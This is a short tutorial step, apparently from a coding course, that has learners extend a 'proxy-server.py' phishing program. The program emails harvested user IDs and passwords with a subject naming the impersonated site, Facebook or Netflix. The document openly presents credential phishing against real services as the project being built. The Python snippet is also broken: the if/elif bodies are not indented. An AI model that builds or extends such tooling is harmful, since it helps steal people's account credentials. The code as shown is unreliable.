Add a Subject to the Email
=================


In this activity, you will learn to add the name of the phishing site as the subject of the email.




<img src= "https://s3.amazonaws.com/media-p.slid.es/uploads/1525749/images/10986021/C123_full_activity.gif" width = "520" height = "250">




Follow the given steps to complete this activity:
   
1. Create and place the required widgets.




* Open the file `proxy-server.py`.




* Check the user's choice and update the subject of the email.
~~~python
    def send_email(user_id, user_password):
        . . .
        . . .
        subject = 'User Credentials'
        if choice == "1":
        subject = subject + ": Facebook"
        elif choice == "2":
        subject = subject + ": Netflix"
~~~


* Save and run the code to check the output.
